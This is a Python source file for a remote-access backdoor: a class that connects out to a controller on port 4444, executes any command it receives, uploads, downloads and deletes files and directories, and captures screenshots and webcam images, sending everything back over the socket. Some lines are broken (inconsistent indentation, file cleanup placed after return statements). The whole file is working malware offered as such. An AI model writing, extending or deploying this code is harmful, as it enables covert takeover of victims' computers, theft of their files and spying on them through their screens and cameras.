#!usr/bin/env python

# Import the modules.
import subprocess
import json
import os
import socket
import sys
import base64
import shutil
import autopy
import cv2
import sys

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a socket object.
        self.connection.connect((ip, port)) # Connect to the ip and port.
        self.homedir = os.environ["HOME"]

    def reliable_send(self, data):
        json_data = json.dumps(data) # Create a json object to package the data.
        self.connection.send(json_data) # Send the package.

    def reliable_recv(self):
        json_data = "" # Json data is at first nothing.
        while True: # Infinite loop.
            try: 
                json_data =  self.connection.recv(1024) # Receive the data from the socket.
                return json.loads(json_data)
            except ValueError: 
                continue # Go back to the beginning of the loop.

    def execute_sys_command(self, sys_command):
        try:
            return subprocess.check_output(sys_command, shell=False)
        except subprocess.CalledProcessError:
            return "[-] Error during command execution."

    def change_working_dir(self, path):
        os.chdir(str(path)) # Change to the path.
        return "[+] Changing working directory to " + path

    def write_file(self, path, content):
		with open(path, "wb") as file: # Allow to write as binary.
			file.write(base64.b64decode(content)) # Decode with base64.
			return "[+] Upload successful."

    def read_file(self, path):
        with open(path, "rb") as file: # Allows to read as binary -> Downloading, uploading.
            return base64.b64encode(file.read()) # Encode with base64.

    def remove_file(self, path):
        return os.remove(path)

    def remove_dir(self, path):
        return shutil.rmtree(path)

    def screenshot(self, path):
        image = autopy.bitmap.capture_screen()
        image.save(path)

        with open(path, "rb") as file:
            return base64.b64encode(file.read())

        os.remove(path)

    def camera_shot(self, path):
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        out = cv2.imwrite(path, frame)

        with open(path, "rb") as file:
            return base64.b64encode(file.read())

        os.remove(path)

    def run(self):
        while True:
            command = self.reliable_recv() # Receive the command.
            try:

                if command[0] == "exit": # If the first command is "exit".
                    self.connection.close() # Close connection.
                    exit() # Exit.

                elif command[0] == "cd" and len(command) > 1: # If the first command is "cd" and there is something else after.
                    command_result = self.change_working_dir(command[1]) # Execute "self.change_working_dir()" with the second command as the parameter.

                elif command[0] == "cd":
                    command_result = self.change_working_dir(self.homedir) # Execute "self.change_working_dir()" with the second command as the parameter.

                elif command[0] == "download":
                    command_result = self.read_file(command[1])

                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])

                elif command[0] == "rm" and len(command) > 1:
                    command_result = self.remove_file(command[1])

                elif command[0] == "rmdir" and len(command) > 1:
                    command_result = self.remove_dir(command[1])

                elif command[0] == "screenshot" and len(command) > 1:
                    command_result = self.screenshot(command[1])

                elif command[0] == "webcam" and len(command) > 1:
                    command_result = self.camera_shot(command[1])

                else:
                    command_result = self.execute_sys_command(command) # Execute a normal command.

            except Exception:
                command_result = "[-] Error during command execution."

            self.reliable_send(command_result) # Send to the server the command result.
        
my_backdoor = Backdoor("0.0.0.0", 4444)
my_backdoor.run()
